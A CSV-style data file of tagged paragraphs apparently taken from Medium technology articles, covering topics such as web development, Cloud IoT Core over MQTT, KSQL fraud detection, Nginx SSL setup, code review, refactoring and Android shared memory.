1245,"In programming class, I found the concepts pretty intuitive. The logic behind classes and tic-tac-toe simulator made sense. But when I spent over half of my work periods getting frustrated over a couple of missing semicolons and mis-ordered terms, I decided development was not for me. I wanted to do design and stray as far as I could to a text editor. I burrowed in Sketch, Adobe Creative Suite, In Vision January came along and because of the free time I had resulting from co-op, I wanted to reinvent my website. Now I know web development is totally different from using C++ in class, but the epiphany I made was quite malleable. My old site all in all was a tumblr template that I adjusted some pixels in. I moved a box 30 pixels up and added a couple of links. But in grade 12, I thought I was the coolest kid. I still feared starting a <DOCTYPE! html> all on my own, but I knew I had to take control of an html/css file if I wanted it to look the way I hoped. Even Webflow was a hassle to tackle. So dreading the development ahead, I dipped my toes into Stack Overflow once again and blossomed.","['Programming', 'Development', 'Web Development', 'Language', 'HTML']",2
1246,"Im not afraid to admit that a lot of the code I wrote looking at old files. I sometimes forgot if it was a href or href a. Though a stupid mistake, an easy to fix one, and one that stuck after learning from the mistake. I used SASS and Bootstrap for the first time, and adhered to the documentation introduced on their respective sites. But each problem opened doors to different solutions, no matter the documentation. If I wanted some content to be centred, I could use a bootstrap grid, a container, margins, padding It was the way I approached each task that made me realize, thats the same thing Id do writing an article, the same thing I did in a verbal presentation. There was an end goal to communicate, the language was my tool, and the method to the madness was the science. Developing my own site gave me insight to how programming what I wanted is an art form.","['Programming', 'Development', 'Web Development', 'Language', 'HTML']",19
1247,"Blockchain, another nascent foundational technology, is even less suited to Silicon Valleys traditional mindset. With machine learning, the code can at least be retracted and edited. Blockchain developers have no such luxury. Once a mistake has been deployed, its part of the permanent record. In a centralised system its possible to fix your bug. In a decentralised one thats immutable by design, its impossible. There is no move fast and break things in a blockchain. If you break things, you lose consistency and the blockchain becomes corrupted and worthless.","['Software', 'Hacker', 'Agile', 'Technology']",16
1248,"Technicians and pilots, for example, are forced to step through an exhaustive, boring and very predictable set of instructions before every flight. You certainly wont see that in the decks of thought leaders at expensive conferences on innovation. But a boring checklist is effective. As Zach Holman points out in his excellent 2014 talk, it removes ambiguity. All the debate happens before something gets added, not at the end. That means when youre about to launch a product (or take off from a runway) you need to worry less about implementation and more about process.","['Software', 'Hacker', 'Agile', 'Technology']",0
1249,"Good dev shops of course, do this as a matter of course. At Apple, they have an internal checklist that goes into great detail about the process of releasing a product from beginning to end, from whos responsible to who needs to be looped into the process before it goes live. Even before a team starts working on something, they make a checklist to prep for it. Do we have appropriate access to development and staging servers? Do we have the correct people on the team? When youre done, you check it off. Easy to collaborate on, and easy to understand.","['Software', 'Hacker', 'Agile', 'Technology']",0
1250,"At Github, they approach it slightly differently. While moving fast and breaking things is fine for some features, for others its not. Their first step is identifying what they cannot afford to break, for example, things like billing code, upgrades and data migrations. Once theyve identified these areas the challenge becomes how to leave them untouched, or at least, get 100% assurance on any changes, while still making fast and small edits in other areas. Its like changing an engine while a car is running (and just as tricky). Upon deployment they then run simultaneous versions of the software. In a nutshell, the idea is running both the old and the new code, and only switching to the new code if it performs at least as well as the old version over a significant period of time.","['Software', 'Hacker', 'Agile', 'Technology']",13
1251,"MQTTThis publication is done through a MQTT connection. MQTT is a publish/subscribe-based message protocol; most of the time it lies over TCP [link]. The telemetry message has to be published by the device to the Cloud Iot Core MQTT bridge in a MQTT topic whose name imperatively respects this format: Note: Sub-folders in the topic name are possible. We wont need this feature here but see [link], as it can sometimes be useful. {device-id} is unique to each device. In our case, Mongoose OS creates it from the last 3 bytes of the MAC address of the ESP32. For example it could be esp32_ABB3B4.","['IoT', 'Esp32', 'Mongoose Os', 'Google Cloud', 'Firebase']",11
1252,"Additional config and state topics On the project architecture diagram given at the beginning of this post, we see besides telemetry two other data flows: Config ([link]) and State ([link]): Indeed, the Cloud Io T Core service may publish configuration update messages to a special topic the device has subscribed to. It is useful when we need the device to go to a new state (e.g. update of a parameter for its associated sensor). For efficiency, there should not be more than one message of that type per second per device. Such a message is an arbitrary user-defined blob (well use JSON), up to 64 ki B. The name of this special MQTT topic is imperatively: On the other direction, a device may also publish to a special topic messages concerning its state (e.g. quantity of RAM available, state of a button, or to see if the previous config message had the desired effect) so that Cloud Io T Core monitors the device. For efficiency, this shouldnt be done more than once per second per device. A message is an arbitrary user-defined blob (well use JSON), up to 64 ki B. The topic to which the device publishes its state data has imperatively this name: Note: Sending commands to devices is also possible from Cloud Io T Core: see [link].","['IoT', 'Esp32', 'Mongoose Os', 'Google Cloud', 'Firebase']",11
1253,"Mongoose OS ([link], [link]) is a smart Io T-oriented OS, runnable on several chips, including ESP8266 and ESP32. Mongoose OS is in partnership with the major actors in Io T ([link]). It comes with a development tool called mos, working either in a UI or with a Command Line Terminal (like __url__ in Windows). In either cases, well write mos commands. There is also a device management app called m Dash but we didnt try it. Numerous APIs dealing with most of the network and sensor protocols are provided. Programs can be written in both C/C++ and JS.","['IoT', 'Esp32', 'Mongoose Os', 'Google Cloud', 'Firebase']",11
1254,"When the device reboots, we see in the console that it successfully connects to the Google MQTT bridge and publishes telemetry messages (MQTT.pub() returns 1): We head to __url__ later.","['IoT', 'Esp32', 'Mongoose Os', 'Google Cloud', 'Firebase']",11
1255,"Lets pull this into KSQL and see what we can do So far, so good. No naughty transactionsjust three regular ones from three different accounts. Now, lets fire in two more. The first is a second transaction at the same location for the same account (someone forgot to pick up the drinks bill! ); the second one is our nefarious fraudster, with a clone of the card for account ac_03 drawing cash from an ATM elsewhere: Youll see these two new transactions appear straightaway in the KSQL output:ac_03 is the one were interested in, and the transaction ID has an X prefix to help us spot it in the output, and the key thing is that its the same account in a different location (Flying Pig Bistroand then Barclays). All Kafka messages have a timestamp (as well as a key and value). This can be set by the producing application, or it will otherwise take the value of the time at which the message arrived at the broker. KSQL exposes the messages timestamp through the system column ROWTIME: The two transactions for account ac_03 occurred within the span of just over five minutes.","['Big Data', 'Open Source', 'Fintech', 'Data Science', 'Engineering']",3
1256,"The only two results are those on the account ac_03, one being genuine (transaction ID 04) and the other fraudulent (X05). Were getting both returned, as each is an event on the left hand stream (the driving one) that joins to the other based on the time window specified (10 minutes before or after the driving event). All we need to do is change our join window to only return events that happen after the one were using to drive the join. To do this, simply specify a zero BEFORE threshold in the WITHINcriteria: With the core logic of the statement built, lets add in a few more bells and whistles. Using the built-in GEO_DISTANCE function, we can include a column in the output showing the distance between the two transactions: We see that transaction 04 took place over 450 kilometers, as the crow flies from X05. What was the time duration between them? We can answer this pretty easily based on the timestamp, but its more sensible just to include it in the query: Weve also combined the distance and time calculations to derive the speed at which someone would have to move between the two events. At 4,648 kph, its almost four times the speed of the fastest supersonic carwe can be pretty sure its fraudulent! One remaining point to make about the above query is that the messages timestamp (ROWTIME) is cast from its BIGINT data type to DOUBLE so that the subsequent division arithmetic will work.","['Big Data', 'Open Source', 'Fintech', 'Data Science', 'Engineering']",3
1257,"We need to make one change to the KSQL statement that we developed above. Whereas we were previously using the Kafka message timestamp as the event rowtime, now, we want to use the timestamp field thats included in the payload of the message. This is easy to do with KSQL by simply specifying the TIMESTAMP field in the WITH clause: Just to check that KSQL is indeed picking up the value of timestamp field in the source message, lets run a query to report the timestamp fields value along with the system column ROWTIME, which represents the timestamp with which KSQL will process the message: As expected, they match. One subtlety to notice here is that the third message above is dated earlierthan the one previously. Thats because the ATM transactions may be arriving out of order. However, KSQL will process them based on event time (i.e., timestamp value in the source message, when the actual ATM transaction occurred) rather than processing time, which refers to when the message arrived at the system.","['Big Data', 'Open Source', 'Fintech', 'Data Science', 'Engineering']",3
1258,"Using the above KSQL application, weve got a Kafka topic being populated with suspect ATM transactions. We can query this from the command line in KSQL to inspect it, but at the end of the day, its just a Kafka topic. We can use this Kafka topic for multiple independent purposes, including: Drive a microserviceperhaps to trigger an alert or block on a particular card Stream the data to a store, such as Elasticsearch, for visualization and analysis in Kibana Streaming data from Kafka to Elasticsearch is easy using Kafka Connect and the Elasticsearch connector. Check out the code on Git Hub for full details, but in essence, its two scripts: A dynamic mapping template for the Elasticsearch indices so that things like geopoints and timestamps are set up correctly A Kafka Connect JSON configuration specifying the Kafka topics from which to stream data and the corresponding Elasticsearch indices to load With the data in Elasticsearch, we can easily build some powerful dashboards and analyses with Kibana. Heres a view of all suspected fraudulent activity in a region, with hotspots highlighted: By selecting a specific account, all ATM transactions for that account can be shown for further analysis. Here, any fraud alerts for account a410 are shown and plotted on the map: You can also use Kibana to draw a bounding box around a particular region of the map to filter events just for that area: Weve taken an inbound stream of events and used KSQL to populate a Kafka topic of transactions that look potentially fraudulent. But all we have to go on is the account number. Wouldnt it be more useful if we can include in our event stream information about the account itself? We can then show the account information in the visual analysis, as well as using it to drive notifications directly.","['Big Data', 'Open Source', 'Fintech', 'Data Science', 'Engineering']",8
1259,"Lets assume that we have all of our customer information in a database. Pretty standard place to keep it. Its maintained by a separate application, and it is our master store of customer data. In this case Im using My SQL, but it could be any RDBMS, really: Using Kafka Connect and a CDC tool such as Debezium, we can stream the contents of it to a Kafka topic, as well as any changes made to the data, in real time. With the data in a Kafka topic, its possible to model it as a table and join it to the event stream of ATM transactions: If something changes in the database, its reflected straight away in the Kafka topic (and thus KSQL table too): __url__ holder.","['Big Data', 'Open Source', 'Fintech', 'Data Science', 'Engineering']",8
1260,"After a lot of trial and error, I found a way to secure my site, all from the Nginx webserver config on AWS, which I use to serve up the Angular app. If you need guidance to install Nginx on an Ubuntu EC2 instance, you can find it here: __url__ editor.","['Nginx', 'Ssl', 'Ssl Certificate', 'Godaddy', 'AWS']",7
1261,"Next, concatenate the two files by adding your certificate to the chain of certificates, right at the top. At the end you should have __url__ file with a chain of certificates, starting with your intermediate certificates and followed by the entire chain of root certificates, as such: The other file is the private key to the certificate. Transfer both to your EC2 instance and store them in an arbitrary location. Then, add these two files to your __url__ port 443 configuration, as such: Additionally, add some SSL config to allow your certificates to play nicely with Nginx: Now, direct the port config to the static files you need Nginx to serve: Now, we have to set up a reverse proxy to redirect HTTPS back to HTTP: Lastly, we need to add an error page, which is already built and stored in an Nginx folder. Simply paste in this code: From here, you should be able to hit your server after changing any and all REST requests to https. The reverse proxy will automatically redirect the requests to HTTP so your server will not have to be updated at all.","['Nginx', 'Ssl', 'Ssl Certificate', 'Godaddy', 'AWS']",7
1262,"However, most of these only solve half the problem. Extra time for quality is a luxury for startups. Metrics help gauge breakage (assuming errors and logs have been well structured), but having a bug-free code doesnt mean good code quality. Code reviews work well but are often ineffective when the reviewer is fragmented across projects and is mostly doing syntax / style reviews. Code reviews are also often too late in the the dev cycle to change code architecture. Documentation is tough to get right because it requires constant upkeep. Unit tests and coverage proactively tests breakage but not the design.","['Design Thinking', 'Architecture', 'Microservices', 'Modular Design']",13
1263,"Given you have your vocabulary set with the Concepts, now comes the phase to brainstorm and draft what components need to be built and how they all interconnect. Start with dividing your feature/system into single-purpose boxes. Use only boxes and nouns to draw out all the components. Go as granular as you can. Each box should serve only one type of purpose, else it needs more division. Create a full picture by chalking out the downstream services (i.e. where you are getting the data from) and upstream services (i.e. who might be querying the new code). Idea is to quickly divide your thoughts into independent pieces at a high level without filling out details. End goal create a modular map of your system.","['Design Thinking', 'Architecture', 'Microservices', 'Modular Design']",8
1264,"With the vocabulary set and a rough thought on the modularity, its time to define what each component does. Take each new box, and try defining its purpose using ONLY the concept vocabulary. Each box could be modelled either as a data-repository or as a function with input / output. You could further chalk out the different APIs that would be needed to give a fuller picture. At a design phase, best done by annotating the different kinds of APIs exposed without jumping into details (CRUD, Aggregator, Search, Computation). End goal crisply define the purpose and contour of each component.","['Design Thinking', 'Architecture', 'Microservices', 'Modular Design']",14
1265,"Write down the whole folder structure before you start. The modularity of your actual code is represented with the folder / file structure you have. Sibling folders / files can access each other, but not inside the other. Enforcing the proper access of code at a folder/file (modules) level wins you most of the battle w.r.t.","['Design Thinking', 'Architecture', 'Microservices', 'Modular Design']",18
1266,"Before starting to write, pseudo-write code-blocks and functions. Discuss this and get this reviewed. Each code block should be independent in its purpose. Simply mark functions, and code blocks within them with a simple line stating what will happen.","['Design Thinking', 'Architecture', 'Microservices', 'Modular Design']",9
1267,"A few more details to seek when perfecting design Dealing with Legacy (data, migration and legacy code)Flavour of Data Access / Storage (batch, bulk, sync, async)Monitoring Strategy Testing Strategy What happens as a result of scaling this framework is that code automatically starts to decouple and engineers start to care a lot more about the usefulness of their design. Less time is spent on communicating what. Multiple teams (including product/design) start to talk in terms of boxes and vectors/functions. This eventually map to and makes it easy to split teams. With a well modularised code base mapped to a well mapped team, it becomes easy to define and track granular metrics. Due to the proactive work on quality, less time is spent on refactors and maintenance and more time is spent on problem solving and impact.","['Design Thinking', 'Architecture', 'Microservices', 'Modular Design']",10
1268,"There are various tests for randomness. For example, we could define an aver-age value which is half way between the number range, and then determine the ratio of the values above and below the half way value. This will work, but will not show us if the values are well distributed. Along with this we could determine the arithmetic mean of the values, and match it to the centre value within the range of numbers. An improved method to test for the distribution of values is the Monte Carlo value for Pi test. With this method, we take our random numbers and scale them between 0.0 and 1.0. Next we take two values at a time and calculate: Sqrt(x + y)If this value is less than or equal to one, we place in the circle (with a radius of 1), otherwise it is out of the circle. The estimation of PI is then four times the number of points in the circle (M) divided by the total number of points (N). In the figure below, the blue points are outside the circle and the yellow ones are inside: We thus need to test our data and see if we get a value close to PI.","['Cryptography', 'Cybersecurity']",14
1269,"Another method for determining randomness is to measure the entropy of the data. It is a defined by Claude E. Shannon in his 1948 paper, where the maximum entropy occurs when there is an equal distribution of all bytes across the data. Normally we define these in terms of bytes. The method we use is to take the frequencies of the byte values and calculate how many bits are at used. A maximum entropy is 8 bits (for a byte value): Here is the calculator is here.","['Cryptography', 'Cybersecurity']",3
1270,"If you arent familiar with Unix Sockets (also known as Berkeley Sockets) I would read more about them first here and here. Basically, a socket in a Unix OS is designed to allow an user to open a communication channel with another process, even on a different computer. To read this Medium article you need to call an HTTP request which uses a TCP socket connection underneath. There are various forms of socket connections and the Unix Socket is the fundamental base element regardless of how its used in the application. There are two commonly used Unix Domains from the socket(2) manual: AF_INET and AF_UNIX. The AF_INET is used to communicate with the IP protocol which is for all your internet based applications. But what if you want to send data to another process on the same machine? This is where AF_UNIX comes in.","['Android Ndk', 'Ndk', 'Ahardwarebuffer', 'Unix Sockets', 'Android Ipc']",11
1271,"At its core, the AF_UNIX socket creates a socket and returns a file descriptor. This file needs to be accessible to both processes, which in this case is both our apps. Android for security reasons does not let you just start writing and reading from any files and this poses restrictions. I tried using the public external storage directory, but kept getting errors trying to set up my socket on these files. The workaround for this is to use an abstracted namespace for the socket. This allows each process to point to the same file descriptor by using a matching name instead of an actual absolute file location on the device. To achieve this we need to set the first byte in the sun_path value to a null terminator.","['Android Ndk', 'Ndk', 'Ahardwarebuffer', 'Unix Sockets', 'Android Ipc']",7
1272,"The first thing you need to do is setup a file descriptor reference for both the server and client with the socket() function. The example uses SOCK_STREAM which makes sure the data is sent with a TCP-like protocol (SOCK_DGRAM and SOCK_SEQPACKET are also other options). From here the server needs to bind() the socket to the type it is. This is where we set the AF_UNIX telling the server the socket is a Unix Domain socket and the file path to set it. The server now calls listen() with the number of back buffers to allocate for being able to receive incoming socket request. The server now calls accept() which will block the code until a client sends a request to connect. The accept() function returns the socket used with the AHardware Buffer function calls. Also note that we run a separate thread for the server because the accept() function blocks the flow of execution. On the client side, after we create a socket() we need to setup the connect() call with the same AF_UNIX and file path as the servers bind() call. After the a successful connect()/accept() combination, the two sides can send data with calls like write() and read() but we will be using the AHardware Buffer methods instead.","['Android Ndk', 'Ndk', 'Ahardwarebuffer', 'Unix Sockets', 'Android Ipc']",11
1273,"The idea is pretty simple, you have a process to create some memory which can be accessed by another process. There are already ways of doing this normally using the shm_open() function and mmap() which involves a lot more code. The Android 8.0 release also gave us a Shared Memory API (<android/sharedmem.h>) which helps with this task since Android will not just let you start calling shm_open() for security risks. The Shared Memory API is designed (to my knowledge) for other NDK API like the Nerual Networks API as seen in this example from ggfan. So even if you use the Shared Memory API to set up some shared memory you will need to find a way to send it over to the other process. The issue is you cant just send the file descriptor over since a file descriptor is nothing more then an integers that maps a process to a file. This means each process wont have the same value. Luckily there is a way to use struct msghdr to wrap the file descriptor and send the file descriptor with the sendmsg() call. This is verbose and takes some knowledge to do right and error check, so lucky this where AHardware Buffer comes in! As mentioned above you can write your own code to send the file descriptor over your Unix domain socket, but the NDK team already did for you! This is the source code for AHardware Buffer_send Handle To Unix Socket() which we can use to send our shared memory buffer over. I want to point out this was designed with the GPU in mind as given from both the description of AHardware Buffer and the source code using the internal NDK Graphic Buffer object and the android::hardward::graphics::mapper namespace. One future application was also proposed by Vulkan users who wanted an alternative to GL_TEXTURE_EXTERNAL_OES since you needed to read data from something like a camera to the CPU memory then copy it over to the GPU which a wasteful copy. The idea is to have a shared memory (since the CPU and GPU share memory anyway on mobile So C) so applications like AR can get the extra speed advantage. The demo I made was designed as an easier way to show the use of AHardware Buffer The first thing we need is to allocate some shared memory which you use the AHardware Buffer_Desc struct to describe the buffer you want. There are various enumerations and options to set it with. Once you have your description we can call From here we have now acquired the AHardware Buffer on creation. The next thing to do is write our data to it from a virtual mapping created with the AHardware Buffer_lock() call. For this example, I generated a gradient pattern to set it with. For the example we are assuming a controlled access pattern so no need for a fence, but please read AHardware Buffer_lock() for details about threading considerations. Also dont forget to AHardware Buffer_unlock() when done using the memory.","['Android Ndk', 'Ndk', 'Ahardwarebuffer', 'Unix Sockets', 'Android Ipc']",3
1274,"Say we send a request to www.mywebapp.com. This is gonna send a request for the root (/) resource. That request is going to first reach a Cloud Front server (called an edge cache). The Cloud Front server will then see if it already has the requested content. If it does, itll respond with it (which will be the __url__ in our case). If not, itll request it from the S3 bucket, cache it, then respond to the user with it. We can then repeat this reasoning for any other resources we bundle with our React app (your main bundle.js, image assets, CSS files, etc. )What if we instead send a request to __url__ (like our React app might)? This request is going to first meet an Elastic Beanstalk load balancer, which forwards requests to one of the underlying EC2 containers. These underlying EC2 containers are what actually contain the code for our Node server. Elastic Beanstalks job is simply to do this forwarding and to (elastically) add or remove containers as our applications needs change.","['AWS', 'Nodejs', 'React', 'Continuous Deployment', 'Continuous Integration']",11
1275,"It is the authors responsibility to submit CRs that are easy to review in order not to waste reviewers time and motivation: Scope and size. Changes should have a narrow, well-defined, self-contained scope that they cover exhaustively. For example, a change may implement a new feature or fix a bug. Shorter changes are preferred over longer ones. If a CR makes substantive changes to more than ~5 files, or took longer than 12 days to write, or would take more than 20 minutes to review, consider splitting it into multiple self-contained CRs. For example, a developer can submit one change that defines the API for a new feature in terms of interfaces and documentation, and a second change that adds implementations for those interfaces.","['Software Development', 'Palantirtech', 'Code Quality', 'Code Review', 'Software Engineering']",13
1276,"As a reviewer, it is your responsibility to enforce coding standards and keep the quality bar up. Reviewing code is more of an art than a science. The only way to learn it is to do it; an experienced reviewer should consider putting other less experienced reviewers on their changes and have them do a review first. Assuming the author has followed the guidelines above (especially with respect to self-review and ensuring the code runs), heres an list of things a reviewer should pay attention to in a code review: Does this code accomplish the authors purpose? Every change should have a specific reason (new feature, refactor, bugfix, etc). Does the submitted code actually accomplish this purpose? Functions and classes should exist for a reason. When the reason is not clear to the reviewer, this may be an indication that the code needs to be rewritten or supported with comments or tests.","['Software Development', 'Palantirtech', 'Code Quality', 'Code Review', 'Software Engineering']",13
1277,"Think about how you would have solved the problem. If its different, why is that? Does your code handle more (edge) cases? Is it shorter/easier/cleaner/faster/safer yet functionally equivalent? Is there some underlying pattern you spotted that isnt captured by the current code? Do you see potential for useful abstractions? Partially duplicated code often indicates that a more abstract or general piece of functionality can be extracted and then reused in different contexts.","['Software Development', 'Palantirtech', 'Code Quality', 'Code Review', 'Software Engineering']",9
1278,"Think about libraries or existing product code. When someone re-implements existing functionality, more often than not its simply because they dont know it already exists. Sometimes, code or functionality is duplicated on purpose, e.g., in order to avoid dependencies. In such cases, a code comment can clarify the intent. Is the introduced functionality already provided by an existing library? Does the change follow standard patterns? Established code bases often exhibit patterns around naming conventions, program logic decomposition, data type definitions, etc. It is usually desirable that changes are implemented in accordance with existing patterns.","['Software Development', 'Palantirtech', 'Code Quality', 'Code Review', 'Software Engineering']",9
1279,"Did you grasp the concepts in a reasonable amount of time? Was the flow sane and were variable and methods names easy to follow? Were you able to keep track through multiple files or functions? Were you put off by inconsistent naming? Does the code adhere to coding guidelines and code style? Is the code consistent with the project in terms of style, API conventions, etc.? As mentioned above, we prefer to settle style debates with automated tooling.","['Software Development', 'Palantirtech', 'Code Quality', 'Code Review', 'Software Engineering']",9
1280,"If there are no tests and there should be, ask the author to write some. Truly untestable features are rare, while untested implementations of features are unfortunately common. Check the tests themselves: are they covering interesting cases? Does the CR lower overall test coverage? Think of ways this code could break. Style standards for tests are often different than core code, but still important.","['Software Development', 'Palantirtech', 'Code Quality', 'Code Review', 'Software Engineering']",13
1281,"Leave feedback on code-level documentation, comments, and commit messages. Redundant comments clutter the code, and terse commit messages mystify future contributors. This isnt always applicable, but quality comments and commit messages will pay for themselves down the line. (Think of a time you saw an excellent, or truly terrible, commit message or comment. If your project maintains a README, CHANGELOG, or other documentation, was it updated to reflect the changes? Outdated documentation can be more confusing than none, and it will be more costly to fix it in the future than to update it now.","['Software Development', 'Palantirtech', 'Code Quality', 'Code Review', 'Software Engineering']",18
1282,"Heres where the software term diverges from its etymological math roots. When factoring a number, it quickly becomes impossible to reduce it further when the only remaining factors are primes, since a prime number has no factors except for 1 and itself. When youve reached that point, youre done. This is rarely the case with software. Its quite possible to never stop refactoring. The code will never be perfect. Youll always find ways to tweak and spit-polish it here and there. You can refactor and re-refactor and re-re-refactor until pigs fly. We actually need self-control to know when good enough is good enough.","['Refactoring', 'Clean Code', 'Software Development', 'Software Architecture']",9
1283,"If youre refactoring a class, then the class users have every right to expect the class interface to behave exactly as before. The same goes for a method; if you refactor a method that receives a number as a parameter and returns its square root, the users of the method shouldnt expect that behavior to change after your little refactoring incursion. Again, if you refactor the GUI code, the GUI itself should look exactly the same when youre done. To illustrate, if lock engineers suddenly adopt the practice of refactoring and refactor the lock mechanism in your front door, you have every right to expect the doorknob to look and function exactly the same as before. Perhaps the lock internals have been improved with higher quality metals, the pins and tumblers made less likely to jam in cold weather, but you shouldnt expect to see odd protrusions from the doorknob itself, or to have to turn the knob in the opposite direction to open the door. The external interface doesnt change with refactoring. If it does, its no longer a refactoringits a modification. Never venture outside of the cozy confines of the target objects interface.","['Refactoring', 'Clean Code', 'Software Development', 'Software Architecture']",9
1284,"How do you find areas in need of refactoring? According to Fowler, you follow your nose. Have you ever been trying to make heads or tails of a clever piece of code and finally sit back and your chair and yell, This stinks! Well then likely you discovered a code smell. As an example, you find that every time you make a change to class A, you also have to make a change to classes B, C, D, and Y. This is truly a bad smell for a number of reasons, and Fowler refers to this code smell as Shotgun Surgery. In order to rid the world of such malodorous code, you must unbuckle your saddlebags, haul out your heavily laden, weather-beaten old refactoring tackle box and lug it over to the source of the smell. Then, with the delicate care of an archaeologist, the patience of a fly fisherman, and the grit of a rodeo king, you apply the refactorings that will eliminate this odious aroma. You might use Move Method and Move Field to move all of the objects that are changing together into the same place. If you find that you cant find a good home for the poor entangled orphans, use Extract Class to create a new class for them, a new dream home that makes Charles Dickens pen itch.","['Refactoring', 'Clean Code', 'Software Development', 'Software Architecture']",9
1285,"Every time you come upon some poorly crafted class or method and out comes wafting the fetor of eau de odorifrant toilette, youre presented with a sadistic choice: take the time to banish the smell by refactoring the code you love, or suffer the children. Left untreated, these code smells often result in more work, lots more work, further down the line, and taken as a whole are often referred to as the technical debt of your software. The more features and patches you throw at the code without fixing its underlying structural problems, the more interest accumulates on that debt, and the longer and harder you and your team will have to work to pay it off. In fact it could result in the literal bankruptcy of your project. Of course in many cases you didnt introduce the smelly code; you inherited the sins of your predecessors through no fault of your own, but you still have a choice: You can let the smell fester and hope that your successors are understanding when eulogizing about you under their breath, or you can clean the code up now, choose to be the the catalyst for change, the transitional character in the genealogy of your product, the grizzled old engineer that draws a line in the sand and screams defiantly at the stinking, putrid, rotting fish-gut garbage dump of spaghetti code chaos, YOUSHALLNOTPASS!!! This is probably a good place to mention that while you are embroiled in this noble crusade of refactoring, to the project stakeholders it may look as though youre accomplishing nothing. Because quite frankly, youre not accomplishing anything that moves the project closer to meeting its objectives. Refactoring is in some ways similar to cleaning up a construction site before and after work. If you dont do it, construction will take longer than necessary because of lost time looking for tools, tripping over scrap lumber, injuries, etc. But if taken too far, site cleanup can take an exorbitant amount of time and greatly slow down a construction project. If you stop to completely sweep the area clean every time you cut a 2x4, the lumber is probably going to rot before you get a roof on the thing. Much like a skilled craftsman, a skilled developer must always keep the big picture clearly in mind, the Big Why, or he risks getting too sidetracked or even obsessive-compulsive about refactoring. In other words, in professional programming, we dont write code in order to refactorwe refactor in order to write code.","['Refactoring', 'Clean Code', 'Software Development', 'Software Architecture']",9
1286,"If youre brand new to refactoring, youll have a tickling, nagging doubt regarding the safety of the whole process. How do I know Im not introducing bugs into the system when I use, for example, Extract Class, and rip the guts out of a bloated class, carefully forming them into their own new class? The answer of course, is an automated suite of comprehensive tests. Whether you write the tests upfront, or rough them in after development, you need them if you are going to attempt even the simplest of refactorings. As Fowler puts it, good refactoring has a certain rhythm to it: Test, small change, test, small change, test, small change, test. (Note that you test first or you wont be certain that it wasnt already broken.) Just imagine Bill Murray in What About Bob?","['Refactoring', 'Clean Code', 'Software Development', 'Software Architecture']",13
1287,"Speaking of tests, this brings me to a good point: What refactoring is not. To prove this to yourself, just think again about the definition of refactoring: Changing the internal structure of software to make it easier to understand and cheaper to modify without changing its observable behavior. If your software has a bug, it is no doubt manifesting itself in some observable way. So if you refactor a bug, you are making the buggy code easier to understand and cheaper to modify without changing its observable behavior. So the bug is still there, you just made the underlying code prettier.","['Refactoring', 'Clean Code', 'Software Development', 'Software Architecture']",13
1288,"Perhaps understandably, when perusing the catalog of refactorings in Fowlers book, you might worry about degrading performance with some refactorings. For instance, Replace temp with Query. Ill call a method more than once! Its true, but more often than not, performance is not negatively impacted in a measurable way. Unless youre writing a tight loop for an encryption algorithm or trying to cook your own Bit Coin mining software, or youre traveling back in time because you want to program like its 1999 its not going to matter. Like Donald Knuth said, Premature optimization is the root of all evil. If you write beautiful software and discover that some aspect of it is slow, measure the performance; dont guess. Then Youll see where the real bottlenecks are. If you find that 10% of the runtime is being absorbed by a single method, now might by the time to introduce a temporary variable or two. This would also be a good time to add a comment explaining why youre degrading readability or a fellow refactovangelist will sweep through and refactor out your perf hack.","['Refactoring', 'Clean Code', 'Software Development', 'Software Architecture']",3
1289,"Historically, we have defined the accessibility of information or an application as the degree to which it was usable by persons with disabilities using ATs. Applications or content might be consumed on a desktop, in a web browser on a desktop or mobile device, or through an application native to a mobile device. To keep things simple, I will define a platform as a runtime environment for an application, an environment in which an application is executed. Runtime platforms typically include APIs and linkable libraries, application protocols (e.g. for event handling, I/O, and scheduling) and presentation frameworks. In this way, the Microsoft Windows 10 Desktop, a web browser, Java Standard Edition (SE), and i OS 10 all count as runtime platforms.","['Accessibility', 'A11y', 'API', 'Tech', 'Software Architecture']",16
1290,"A11y enablement can be understood in terms of the MVC architecture. The AT (the screen reader, for example) has the goal of rendering a view to the user that is consumable by that user. This view consists primarily of speech that conveys information about the applications model and state to the user. Often, such information will include contextual information about the application that might be readily obvious in the visual presentation such as a list of form controls, all of the links on the page in alphabetical order, or the current row and column position of a table as the user navigates it. The controller is also the AT since the role of the AT is to intercept interactions from the user (e.g. keyboard input) and update the model accordingly as well as to keep track of updates to the model in order to alert the user within the context of the view to the update.","['Accessibility', 'A11y', 'API', 'Tech', 'Software Architecture']",19
1291,"Every accessible object that is a part of the model revealed by an accessibility API has, at minimum, the following properties:accessible Namea short description or label for a control. The accessible Name property is often the label on a button, the text for a checkbox, or the label associated with a drop-down or text field.accessible Rolea description of the purpose or role of the component in the presentation. This property is one of the most important of those presented by the accessible object, informing the AT how to interact with and present the widget. Its value is often simply the type of control having focus, e.g. button, text field, tree, table, calendar. It is also one of the most difficult properties to consume, as most ATs only include implementations for presenting and interacting with a small set of roles.accessible Statethe state of a control, e.g. selected, checked, activated, pressed.accessible Valuethe numeric value, e.g. within a slideraccessible Parent/accessible Childrenthe parent object/child objects of this object. Like many data models, the accessible object model is an object graph. Among other purposes, this allows semantic information regarding the relationship among objects to be provided to the AT.","['Accessibility', 'A11y', 'API', 'Tech', 'Software Architecture']",15
1292,"Three other features of the accessible APIs just described should be noted because they permit these APIs to fulfill all three criteria of an accessible runtime platform. First, most provide access to a set of accessible Relations. Relations between accessible objects provide context for controls that are typically given in visual presentation by placement. For instance, two common (and symmetric) relations are the label For and labeled By relations. An accessible object for a text field, for example, might include the labeled By relation in its set of relations that points to a label. In turn, that label would contain the label For relation for the text field. The screen readers logic for interpreting the relation can then assign the name or description of the field based on this relationship.","['Accessibility', 'A11y', 'API', 'Tech', 'Software Architecture']",15
1293,"Next we decided to look into generative testing. This was something we knew of conceptually but had never applied in a real situation. Generative testing is all about writing code that generates test cases for you. You tell it what a query can look like and what kinds of parameters are possible. Whats great about this approach is the scale. Rather than having tens or hundreds of test cases that have to be written manually, it can generate millions.","['Testing', 'Generative Testing', 'QA', 'Projects']",9
1294,If we were going to use property based testing though we still had to work out what property we wanted to test. What we cared about was making sure that queries didnt get slower from one release to the next. Our breakthrough was when we realised that to evaluate the tests we could run them twice each time. Once against the query planner currently in production and once against the new version. Any difference in the query plans generated would be immediately flagged and investigated by a developer to decide whether it was a regression or an improvement. Most often its an inadvertent change.,"['Testing', 'Generative Testing', 'QA', 'Projects']",13
